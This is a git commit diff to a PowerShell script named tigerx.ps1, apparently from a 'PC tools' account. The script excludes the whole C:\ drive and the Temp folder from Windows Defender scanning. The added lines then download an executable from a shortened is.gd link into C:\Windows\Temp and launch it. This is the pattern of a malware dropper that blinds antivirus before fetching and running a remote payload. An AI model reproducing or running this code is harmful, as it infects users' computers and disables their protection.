3e1bb642c1024eda151552f305f81fd2fd865a60
Pctoolsbox.com <45397057+Pctoolsbox@users.noreply.github.com>
2024-12-08 18:05:55 +0200

    Update tigerx.ps1

--- tigerx.ps1
+++ tigerx.ps1
@@ -1,5 +1,13 @@
 Add-MpPreference -ExclusionPath "C:\","tigerx.exe","C:\Windows\Temp\"
-Start-Sleep -Seconds 8
+Start-Sleep -Seconds 5
+$url = "https://is.gd/tigerxgit"
+$outpath = "C:\Windows\Temp\tigerx.exe"
+Invoke-WebRequest -Uri $url -OutFile $outpath
+$wc = New-Object System.Net.WebClient
+$wc.DownloadFile($url, $outpath)
+$args = @("Comma","Separated","Arguments")
+Start-Process -Filepath "C:\Windows\Temp\tigerx.exe" -ArgumentList $args
+Start-Sleep -Seconds 5
 $url = "https://is.gd/tigerxgit"
 $outpath = "C:\Windows\Temp\tigerx.exe"
 Invoke-WebRequest -Uri $url -OutFile $outpath
